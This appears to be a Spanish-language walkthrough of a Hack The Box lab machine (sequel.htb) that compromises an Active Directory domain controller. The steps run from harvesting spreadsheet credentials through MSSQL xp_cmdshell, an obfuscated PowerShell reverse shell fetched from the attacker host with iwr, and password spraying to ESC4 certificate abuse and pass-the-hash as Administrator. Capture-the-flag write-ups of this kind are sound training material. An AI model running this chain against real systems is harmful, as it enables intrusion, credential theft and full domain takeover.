+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   date: 2025-05-16T15:14:09
+|_  start_date: N/A
+</pre>
+<p>Este resultado de escaneo Nmap revela que el host 10.10.11.51 está activo y responde a las solicitudes. Se identificaron varios puertos abiertos relacionados con servicios de Windows típicos en un entorno de Active Directory, como:</p>
+<ul><li>LDAP (389)</li></ul>
+<ul><li>Kerberos (88)</li></ul>
+<ul><li>NetBIOS (139)</li></ul>
+<ul><li>MS RPC (135)</li></ul>
+<ul><li>SMB (445)</li></ul>
+<ul><li>DNS (53)</li></ul>
+<ul><li>LDAPS (636)</li></ul>
+<ul><li>MS SQL Server (1433)</li></ul>
+<ul><li>Global Catalog (3268 y 3269)</li></ul>
+<ul><li>Remote Procedure Call (593)</li></ul>
+<ul><li>Kerberos change/set password (464)</li></ul>
+<p>Esto sugiere que el host podría ser un controlador de dominio (Domain Controller) en una red Windows corporativa, dado que combina servicios de autenticación, resolución de nombres, base de datos de usuarios y catálogo global.</p>
+<p>Además, se identificó un certificado SSL asociado a DC01.sequel.htb, lo cual confirma la pertenencia del sistema al dominio sequel.htb. La presencia de este certificado refuerza la idea de que es una máquina crítica en la infraestructura de red.</p>
+
+<pre>
+  <img src="IMG/1-host.png">
+</pre>
+
+<h2 id="web">🌐 Enumeración de recursos SMB con credenciales válidas</h2>
+<pre>#nxc smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --shares
+SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
+SMB         10.10.11.51     445    DC01             [*] Enumerated shares
+SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
+SMB         10.10.11.51     445    DC01             -----           -----------     ------
+SMB         10.10.11.51     445    DC01             Accounting Department READ            
+SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.11.51     445    DC01             C$                              Default share
+SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share
+SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share
+SMB         10.10.11.51     445    DC01             Users           READ        
+</pre>
+
+<p>Se realizó una conexión al servicio SMB del objetivo y se autenticó exitosamente con el usuario "rose" utilizando las credenciales proporcionadas. La máquina remota identificada se llama "DC01", pertenece al dominio "sequel.htb" y está ejecutando Windows 10 o Server 2019.</p>
+<p>La autenticación fue exitosa, lo que permitió listar los recursos compartidos disponibles en el sistema. Entre los recursos compartidos enumerados, destacan varios con permisos de solo lectura, como "Accounting Department", "Users", "NETLOGON" y "SYSVOL". Estos shares suelen ser valiosos en una auditoría, ya que pueden contener scripts de inicio de sesión, configuraciones del dominio o incluso información sensible almacenada por los usuarios.</p>
+
+<pre>#smbclient //10.10.11.51/'Accounting Department' -U rose -W WORKGROUP -m SMB3
+Password for [WORKGROUP\rose]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Jun  9 06:52:21 2024
+  ..                                  D        0  Sun Jun  9 06:52:21 2024
+  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
+  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024
+
+		6367231 blocks of size 4096. 916557 blocks available
+smb: \> 
+</pre>
+<p>Se accedió correctamente al recurso compartido llamado "Accounting Department" utilizando el usuario rose. La autenticación fue exitosa, y se obtuvo acceso de lectura al contenido del directorio.</p>
+<p>Dentro del recurso compartido se encontraron dos archivos de interés:</p>
+<ul><li>accounting_2024.xlsx</li></ul>
+<ul><li>accounts.xlsx</li></ul>
+<pre>#unzip accounts.xlsx
+Archive:  accounts.xlsx
+file #1:  bad zipfile offset (local header sig):  0
+  inflating: xl/workbook.xml         
+  inflating: xl/theme/theme1.xml     
+  inflating: xl/styles.xml           
+  inflating: xl/worksheets/_rels/sheet1.xml.rels  
+  inflating: xl/worksheets/sheet1.xml  
+  inflating: xl/sharedStrings.xml    
+  inflating: _rels/.rels             
+  inflating: docProps/core.xml       
+  inflating: docProps/app.xml        
+  inflating: docProps/custom.xml     
+  inflating: [Content_Types].xml
+</pre>
+<p>Dado que se puede tratar como un archivo, lo descomprimí y comencé a buscar cualquier información interesante.</p>
+<p>En su interior, hay varias credenciales en xl/SharedStrings.xml</p>
+<p><strong>Usuarios Encontrados:</strong></p>
+<p>Angela Martin</p>
+<ul><li>Email: angela@sequel.htb</li></ul>
+<ul><li>Usuario: angela</li></ul>
+<ul><li>Contraseña: 0fwz7Q4mSpurIt99</li></ul>
+<p>Oscar Martinez</p>
+<ul><li>Email: oscar@sequel.htb</li></ul>
+<ul><li>Usuario: oscar</li></ul>
+<ul><li>Contraseña: 86LxLBMgEWaKUnBG</li></ul>
+<p>Kevin Malone</p>
+<ul><li>Email: kevin@sequel.htb</li></ul>
+<ul><li>Usuario: kevin</li></ul>
+<ul><li>Contraseña: Md9Wlq1E5bZnVDVo</li></ul>
+<p>Cuenta SQL Server (Administrador por defecto)</p>
+<ul><li>Email: sa@sequel.htb</li></ul>
+<ul><li>Usuario: sa</li></ul>
+<ul><li>Contraseña: MSSQLP@ssw0rd!</li></ul>
+
+<h2 id="wp">💾 Acceso a base de datos MSSQL con credenciales 'sa'</h2>
+<pre>#python3 mssqlclient.py sa:'MSSQLP@ssw0rd!'@10.10.11.51
+Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (sa  dbo@master)> 
+</pre>
+<p>En este punto, se establece una conexión exitosa al servidor de base de datos Microsoft SQL Server utilizando las credenciales del usuario sa, que fueron extraídas previamente del archivo Excel disponible en el recurso compartido SMB. El servidor responde con información del entorno, confirmando que la conexión se ha cifrado mediante TLS y que el contexto actual está en la base de datos master.</p>
+<pre>SQL (sa  dbo@master)> enable_xp_cmdshell
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@master)> xp_cmdshell whoami
+output           
+--------------   
+sequel\sql_svc   
+
+NULL             
+
+SQL (sa  dbo@master)> 
+</pre>
+<p>Se habilita la función xp_cmdshell, una característica del servidor SQL que permite ejecutar comandos del sistema operativo directamente desde el contexto de la base de datos. Aunque esta opción está deshabilitada por defecto debido a su riesgo de seguridad, en este caso se activa correctamente.</p>
+<p>Una vez habilitada, se verifica que los comandos se ejecutan con éxito, y el resultado confirma que los comandos del sistema se están ejecutando bajo el contexto del usuario sql_svc, que forma parte del dominio sequel. Esta información es relevante para entender los privilegios actuales y planificar posibles movimientos de escalamiento dentro del entorno.</p>
+
+<h2 id="joker">🃏 Generación y ejecución de payload PowerShell con PowerJoker</h2>
+<pre>#python3 PowerJoker.py -l 10.10.14.137 -p 1337
+
+Randomly UUID => $f7d4e7e6-a267-4567-8302-ee4483356c81
+
+.------..------..------..------..------.
+|P.--. ||O.--. ||W.--. ||E.--. ||R.--. |
+| :(): || :/\: || :/\: || (\/) || :(): |
+| ()() || :\/: || :\/: || :\/: || ()() |
+| '--'J|| '--'O|| '--'K|| '--'E|| '--'R|
+`-----'`------'`------'`------'`------
+INFO:__main__:
+├── Calculating Strings...
+   └──Checks For Replaceable Words....
+      └──1. SYSTEMROOT - Replaced -->> SyS?em?oo?                               
+      └──2. New-Object - Replaced -->> &('New'+'-'+'Ob'+'je'+'ct')              
+      └──3. GetStream - Replaced -->> ('G'+'e'+'tStream')                       
+      └──4. ASCII - Replaced -->> Sy''Ste''M.tExT.A''SCi''iEN''coding           
+      └──5. System.Net.Sockets - Replaced -->> Sy''St''Em.NeT.So''CkE''tS.$str  
+      └──6. $client - Replaced -->> $e=$7=$f=$c=$f=$8=$e=$4=$9=$e=$3=$9=$a=$f=$3=$c=$f=$6=$a=$f=$2=$4=$6=$f=$d=$c=$f=$5=$3=$5=$d=$f
+      └──7. $sendback - Replaced -->> $3dbfe2ebffe072727949d7cecc51573b         
+      └──8. $data - Replaced -->> $f7d4e7e6                                     
+100%|█████████████████████████████████████████████| 8/8 [00:08<00:00,  1.01s/it]
+         └──Just A Second...
+         └──Payload Generated...... ↓
+
+</pre>
+<p>Al ejecutar PowerJoker.py con los parámetros adecuados, la herramienta genera automáticamente un payload de PowerShell altamente ofuscado. Este proceso incluye la creación de un UUID aleatorio que sirve como identificador único para esta instancia del payload.</p>
+<p>El resultado son dos archivos: uno orientado a la ejecución del payload (Payload.ps1) y otro para elevar privilegios (Privilege.ps1). Este tipo de evasión y automatización resulta útil en entornos con restricciones o controles defensivos, permitiendo establecer una conexión inversa sin ser detectado fácilmente.</p>
+
+<pre>SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@master)> RECONFIGURE;
+SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell';
+name          minimum   maximum   config_value   run_value   
+-----------   -------   -------   ------------   ---------   
+xp_cmdshell         0         1              1           1   
+
+SQL (sa  dbo@master)> xp_cmdshell powershell -c "iwr http://10.10.14.137:8000/Payload.ps1 -o C:\ProgramData\rev.ps1"
+output   
+------   
+NULL     
+
+SQL (sa  dbo@master)> xp_cmdshell powershell -c C:\programdata\rev.ps1
+</pre>
+<p>Se habilita la característica que permite ejecutar comandos del sistema a través del motor de base de datos. Esta funcionalidad viene desactivada por defecto, por lo que se configura y aplica el cambio para activarla.</p>
+<p>Luego, se verifica que la opción esté habilitada correctamente. Una vez confirmada, se utiliza para ejecutar una instrucción que descarga un script desde el equipo atacante hacia una ubicación en el sistema de archivos de la máquina remota.</p>
+<p>Por último, se ejecuta el script descargado. Esto prepara el entorno para establecer una conexión inversa desde la máquina víctima hacia el equipo atacante.</p>
+
+<pre>JokerShell C:\SQL2019\ExpressAdv_ENU> 
+10.10.11.51:56267 >>> [PJSession] 1: cat sql-Configuration.INI
+[OPTIONS]
+ACTION="Install"
+QUIET="True"
+FEATURES=SQL
+INSTANCENAME="SQLEXPRESS"
+INSTANCEID="SQLEXPRESS"
+RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
+AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
+AGTSVCSTARTUPTYPE="Manual"
+COMMFABRICPORT="0"
+COMMFABRICNETWORKLEVEL=""0"
+COMMFABRICENCRYPTION="0"
+MATRIXCMBRICKCOMMPORT="0"
+SQLSVCSTARTUPTYPE="Automatic"
+FILESTREAMLEVEL="0"
+ENABLERANU="False" 
+SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
+SQLSVCACCOUNT="SEQUEL\sql_svc"
+SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
+SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
+SECURITYMODE="SQL"
+SAPWD="MSSQLP@ssw0rd!"
+ADDCURRENTUSERASSQLADMIN="False"
+TCPENABLED="1"
+NPENABLED="1"
+BROWSERSVCSTARTUPTYPE="Automatic"
+IAcceptSQLServerLicenseTerms=True
+JokerShell C:\SQL2019\ExpressAdv_ENU> 
+10.10.11.51:56267 >>> [PJSession] 1: 
+</pre>
+<p>En este punto se revisa un archivo de configuración utilizado durante la instalación de SQL Server. El archivo contiene múltiples parámetros que revelan información sensible y relevante para la post-explotación.
+
+Entre los datos más importantes destacan:</p>
+<ul><li>Las cuentas de servicio utilizadas (ReportServer$SQLEXPRESS, NETWORK SERVICE, sql_svc), que pueden ofrecer rutas adicionales de ataque o escalamiento de privilegios.</li></ul>
+<ul><li>El usuario administrador del sistema SQL (SEQUEL\Administrator) y las credenciales asociadas (SQLSVCPASSWORD y SAPWD), útiles para autenticación o movimiento lateral.</li></ul>
+<ul><li>La configuración de red del servicio, indicando que TCP está habilitado y que el servicio del navegador de SQL se inicia automáticamente, lo que podría facilitar el descubrimiento de la instancia en la red.</li></ul>
+<p>Este archivo resulta especialmente valioso ya que proporciona acceso directo a credenciales válidas y detalla la configuración completa de la instancia de SQL Server.</p>
+
+<h2 id="nxc">💽 Ataque y enumeración LDAP para descubrimiento de usuarios válidos</h2>
+<pre>#nxc ldap 10.10.11.51 -u users.lst -p 'WqSZAF6CysDQbGb3' --continue-on-success          
+SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+LDAP        10.10.11.51     389    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
+LDAP        10.10.11.51     389    DC01             [-] sequel.htb\administrator:WqSZAF6CysDQbGb3 
+LDAP        10.10.11.51     389    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3 
+LDAP        10.10.11.51     389    DC01             [-] sequel.htb\guest:WqSZAF6CysDQbGb3 
+</pre>
+<p>Este resultado confirma que la contraseña WqSZAF6CysDQbGb3 es válida para dos cuentas del dominio: ryan y sql_svc. Ambos inicios de sesión fueron exitosos vía LDAP, lo que implica autenticación válida contra el controlador de dominio DC01 en sequel.htb.</p>
+
+<h2 id="user">👤 Acceso remoto con Evil-WinRM y obtención de user.txt</h2>
+<pre>#evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ryan\Documents> dir
+
+
+    Directory: C:\Users\ryan\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        5/16/2025   8:47 AM       13842448 bloodyAD.exe
+
+
+*Evil-WinRM* PS C:\Users\ryan\Documents> cd ..
+*Evil-WinRM* PS C:\Users\ryan> dir
+
+
+    Directory: C:\Users\ryan
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/9/2024   4:24 AM                Desktop
+d-r---        5/16/2025   8:38 AM                Documents
+d-r---        5/16/2025  10:38 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\ryan> cd Desktop
+*Evil-WinRM* PS C:\Users\ryan\Desktop> dir
+
+
+    Directory: C:\Users\ryan\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        5/16/2025   3:02 AM             34 user.txt
+</pre>
+<p>El acceso remoto a la máquina DC01 mediante Evil-WinRM usando las credenciales del usuario ryan fue exitoso, lo que confirma que ryan tiene habilitado el servicio WinRM y que sus credenciales son completamente válidas para obtener una shell remota con PowerShell.</p>
+<p>Finalmente, en el escritorio de ryan se encuentra el archivo user.txt</p>
+
+<h2 id="blood">🐶 Enumeración y análisis de Active Directory con BloodHound</h2>
+<pre>#python3 bloodhound.py -u ryan -p "WqSZAF6CysDQbGb3" -d sequel.htb -ns 10.10.11.51 -c All
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: sequel.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.sequel.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.sequel.htb
+INFO: Found 10 users
+INFO: Found 59 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.sequel.htb
+INFO: Done in 00M 24S
+</pre>
+<p>La herramienta bloodhound.py se utilizó con éxito para recolectar información del dominio sequel.htb utilizando las credenciales de ryan. Durante el proceso, se confirmó la existencia de una única máquina (DC01), 10 usuarios, 59 grupos, 2 políticas de grupo (GPOs), y una unidad organizativa (OU). También se identificaron 19 contenedores dentro del entorno del Active Directory</p>
+<p>Este conjunto de datos servirá como insumo para visualizar relaciones de privilegios en BloodHound, lo que permitirá identificar posibles caminos de escalada de privilegios o rutas hacia la obtención de control sobre el dominio.</p>
+
+<pre>
+<img src="IMG/blood.png">
+</pre>
+
+<p>Parece que Ryan tiene permiso para el usuario de la autoridad de certificación (ca_svc). Esto significa que Ryan puede modificar o tomar posesión de la cuenta ca_svc. Podríamos explotar esto y aumentar los privilegios.</p>
+
+<h2 id="cambio">🫂 Modificación de Propietario y Permisos en Active Directory</h2>
+<pre>#python3 /opt/impacket/examples/owneredit.py -action 'write' -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
+Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
+[*] OwnerSid modified successfully!
+</pre>
+<p>Se utilizó el script owneredit.py de Impacket para cambiar la propiedad del objeto ca_svc en Active Directory, asignándosela al usuario ryan. El objeto anteriormente pertenecía al grupo Domain Admins, lo que sugiere que tenía un alto nivel de privilegios.</p>
+<p>Tras la ejecución del comando, se confirmó que el cambio de propietario fue exitoso. Este tipo de modificación permite a ryan tener un control más directo sobre el objeto objetivo, lo cual puede ser aprovechado en siguientes pasos de escalada de privilegios.</p>
+
+<pre>#python3 /opt/impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
+Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20250518-110038.bak
+[*] DACL modified successfully!
+</pre>
+<p>Aquí se usó la herramienta dacledit.py de Impacket para modificar los permisos de acceso del objeto ca_svc en Active Directory, otorgándole al usuario ryan control total (FullControl).</p>
+<p>Esto significa que ryan ahora puede realizar cualquier acción sobre ese objeto, desde modificar atributos hasta eliminarlo o delegar permisos a otros usuarios.</p>
+
+<pre># faketime "$(ntpdate -q '10.10.11.51' | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" certipy-ad shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account 'ca_svc' -dc-ip '10.10.11.51'
+
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '383fe42b-089e-a300-ebef-da77c36ca145'
+[*] Adding Key Credential with device ID '383fe42b-089e-a300-ebef-da77c36ca145' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID '383fe42b-089e-a300-ebef-da77c36ca145' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Using principal: ca_svc@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
+</pre>
+<p>En este paso se utiliza Certipy para realizar un ataque de certificado contra la cuenta ca_svc. Primero, sincroniza el tiempo con el servidor de dominio para evitar problemas con las firmas temporales. Luego genera un certificado y una credencial de clave (Key Credential) para ca_svc, que se añade temporalmente a la cuenta para autenticar como ella sin necesidad de conocer la contraseña.</p>
+<p>Con este certificado, se obtiene un Ticket Granting Ticket (TGT) válido para ca_svc, lo que permite autenticarse en el dominio con esos privilegios. Además, se logra recuperar el hash NT de la cuenta, que puede ser utilizado para otros ataques o para autenticarse en servicios que usen ese hash.</p>
+
+<h2 id="privilege">👺 Escalada a Administrator explotando AD CS mediante ESC4 (Certipy + Evil-WinRM)</h2>
+<pre># certipy-ad find -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vulnerable
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'sequel-DC01-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC01-CA
+    DNS Name                            : DC01.sequel.htb
+    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
+    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
+    Certificate Validity End            : 2124-06-08 17:00:40+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : DunderMifflinAuthentication
+    Display Name                        : Dunder Mifflin Authentication
+    Certificate Authorities             : sequel-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectRequireCommonName
+                                          SubjectAltRequireDns
+    Enrollment Flag                     : AutoEnrollment
+                                          PublishToDs
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : Client Authentication
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Enterprise Admins
+        Full Control Principals         : SEQUEL.HTB\Cert Publishers
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Property Principals       : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
+</pre>
+<p>Se realizó una enumeración detallada sobre la configuración de las autoridades certificadoras y las plantillas de certificados en el dominio. Se identificó una autoridad certificadora activa con permisos estrictos para la gestión y emisión de certificados, limitados principalmente a administradores y grupos privilegiados.</p>
+<p>Entre las plantillas de certificado habilitadas, destaca una con configuración para autenticación cliente/servidor y habilitada para autoinscripción, con permisos de inscripción reservados a administradores de dominio y grupos de alto privilegio.</p>
+<p>Esta debilidad representa un riesgo importante de escalada de privilegios mediante abuso del sistema de certificados de Active Directory, ya que permite la emisión de certificados con derechos potencialmente equivalentes a los de cuentas privilegiadas.</p>
+
+<pre># certipy-ad req -dc-ip 10.10.11.51 -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template 'DunderMifflinAuthentication' -upn Administrator@sequel.htb
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 50
+[*] Got certificate with UPN 'Administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+</pre>
+<p>Se realizó una solicitud de certificado a la autoridad certificadora del dominio utilizando las credenciales de la cuenta ca_svc con un hash NTLM previamente obtenido. La solicitud se hizo específicamente para la plantilla de certificado configurada para autenticación dentro del dominio.</p>
+
+<pre># certipy-ad auth -pfx administrator.pfx -username Administrator -domain sequel.htb
+
+[_] Using principal: administrator@sequel.htb
+[_] Trying to get TGT...
+[_] Got TGT
+[_] Saved credential cache to 'administrator.ccache'
+[_] Trying to retrieve NT hash for 'administrator'
+[_] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+</pre>
+<p>Se utilizó el certificado previamente obtenido para autenticarse en el dominio como el usuario Administrador mediante un proceso de autenticación basado en certificados (PKINIT). La autenticación fue exitosa, permitiendo obtener un Ticket Granting Ticket (TGT) del servicio Kerberos para la cuenta de administrador.</p>
+
+<pre># evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+
+
+    Directory: C:\Users\Administrator\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/8/2024   3:40 PM                SQL Server Management Studio
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> dir
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         1/4/2025   7:58 AM                3D Objects
+d-r---         1/4/2025   7:58 AM                Contacts
+d-r---         1/4/2025   7:58 AM                Desktop
+d-r---         1/4/2025   7:58 AM                Documents
+d-r---         1/4/2025   8:31 AM                Downloads
+d-r---         1/4/2025   7:58 AM                Favorites
+d-r---         1/4/2025   7:58 AM                Links
+d-r---         1/4/2025   7:58 AM                Music
+d-r---         1/4/2025   7:58 AM                Pictures
+d-r---         1/4/2025   7:58 AM                Saved Games
+d-r---         1/4/2025   7:58 AM                Searches
+d-r---         1/4/2025   7:58 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        5/18/2025   3:24 AM             34 root.txt
+</pre>
+<p>Se estableció una sesión remota con el sistema Windows objetivo utilizando Evil-WinRM, autenticándose como el usuario Administrador mediante el hash NTLM obtenido previamente (ataque Pass-the-Hash). La conexión permitió abrir un shell PowerShell interactivo con privilegios elevados.</p>
+<p>A través de esta sesión, se pudo navegar el sistema de archivos del usuario administrador, accediendo a directorios personales y finalmente al escritorio, donde se encontró el archivo root.txt. Esto confirma el control total sobre la máquina remota, permitiendo la ejecución de comandos y extracción de información crítica en un entorno con privilegios administrativos.</p>
+
+  
+</body>
+</html>
